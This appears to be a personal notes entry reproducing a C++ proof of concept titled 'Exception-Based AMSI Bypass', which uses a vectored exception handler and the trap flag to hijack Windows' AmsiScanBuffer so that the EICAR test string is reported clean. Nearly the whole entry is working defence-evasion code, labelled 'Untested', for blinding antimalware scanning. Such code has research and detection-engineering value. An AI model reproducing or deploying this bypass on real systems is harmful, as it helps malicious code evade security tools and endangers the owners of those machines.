### VEH Bypass
Untested

https://gist.github.com/aaaddress1/5536d27b4d7ec29e474551086a2f0b63


```cpp
// Exception-Based AMSI Bypass
// by aaaddress1@chroot.org
#include <amsi.h>
#include <iostream>
#include <Windows.h>
#pragma comment(lib, "amsi.lib")
#pragma comment(lib, "ole32.lib")
#pragma warning( disable : 4996 )

#define AMSIPROJECTNAME L"scanner"
HAMSICONTEXT context{ 0 };
AMSI_RESULT amsiRes = AMSI_RESULT_DETECTED;
HAMSISESSION session = nullptr;

void veh_AmsiScanHijack() {
    AddVectoredExceptionHandler(0, PVECTORED_EXCEPTION_HANDLER([](PEXCEPTION_POINTERS pexinf) -> LONG {
        if (pexinf->ExceptionRecord->ExceptionCode != EXCEPTION_SINGLE_STEP)
            return EXCEPTION_CONTINUE_SEARCH;

        if (size_t(AmsiScanBuffer) == pexinf->ContextRecord->Eip) {
            pexinf->ContextRecord->Eax = S_OK;
            pexinf->ContextRecord->Eip = ((uint32_t*)pexinf->ContextRecord->Esp)[0];
            *(AMSI_RESULT*)((uint32_t*)pexinf->ContextRecord->Esp)[6] = AMSI_RESULT_CLEAN;
            pexinf->ContextRecord->Esp += (0x18 + 1) * sizeof(uint32_t);
        }

        if (!strncmp((PCHAR)pexinf->ContextRecord->Eip, "\xCC", 1))
            pexinf->ContextRecord->Eip += 1;
        else if (*(PBYTE)pexinf->ContextRecord->Eip != 0xea && *(PWORD)(pexinf->ContextRecord->Eip + 5) != 0x33)
            pexinf->ContextRecord->EFlags |= 0x100;
        return EXCEPTION_CONTINUE_EXECUTION;
        }));
    _asm {
        pushfd
        or dword ptr[esp], 0x100
        popfd
    }
}

void main() {
    // Init AMSI
    CoInitializeEx(0, COINIT_MULTITHREADED);
    AmsiInitialize(AMSIPROJECTNAME, &context);
    AmsiOpenSession(context, &session);
    puts("[+] Scanning EICAR Sample ...");

    // Scan EICAR
    veh_AmsiScanHijack();
    #define EICAR "X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"
    if (AmsiScanBuffer(context, (LPVOID)EICAR, sizeof(EICAR), L"useless", session, &amsiRes) != S_OK)
        puts("[!] AmsiScanBuffer failed. Did you disable something for Windows Defender?");
    _asm _emit 0xCC;

    printf("[+] RiskLevel Score = %i\n", amsiRes);
    printf("[+] Malicious? %s\n", AmsiResultIsMalware(amsiRes) ? "TRUE" : "FALSE");
    system("PAUSE");
}
```